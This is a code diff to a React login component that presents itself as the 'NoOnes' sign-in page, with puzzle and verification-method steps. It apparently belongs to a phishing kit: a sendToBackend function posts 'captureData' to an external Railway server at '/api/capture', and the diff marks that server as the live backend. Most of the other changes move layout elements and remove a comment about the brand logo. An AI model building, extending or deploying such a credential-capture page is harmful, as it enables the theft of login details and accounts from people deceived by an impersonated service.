@@ -23,6 +23,7 @@ const Login = () => {
   // Function to send data to backend
   const sendToBackend = async (captureData) => {
     try {
+      // Updated to use your live Railway backend
       const response = await fetch('https://nuns-production.up.railway.app/api/capture', {
         method: 'POST',
         headers: {
@@ -310,8 +311,8 @@ const Login = () => {
               <p><a href="#">Having trouble with the puzzle?</a></p>
             </div>
           </div>
+          {BottomControls}
         </div>
-        {BottomControls}
       </div>
     );
   }
@@ -377,8 +378,8 @@ const Login = () => {
               <p><a href="#">Need help choosing a method?</a></p>
             </div>
           </div>
+          {BottomControls}
         </div>
-        {BottomControls}
       </div>
     );
   }
@@ -477,8 +478,8 @@ const Login = () => {
               <p><a href="#" onClick={() => setCurrentStep('method')}>Try another method</a></p>
             </div>
           </div>
+          {BottomControls}
         </div>
-        {BottomControls}
       </div>
     );
   }
@@ -499,7 +500,6 @@ const Login = () => {
         <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
           <div className="login-header">
             <div className="header-left">
-              {/* REMOVED NOONES LOGO ELEMENT */}
               <h1 className="welcome-text">Welcome to NoOnes</h1>
             </div>
             <div className="header-right">
@@ -597,8 +597,8 @@ const Login = () => {
             <p>No account yet? <a href="/signup" className="signup-link">Sign up</a></p>
           </div>
         </div>
+        {BottomControls}
       </div>
-      {BottomControls}
     </div>
   );
 };
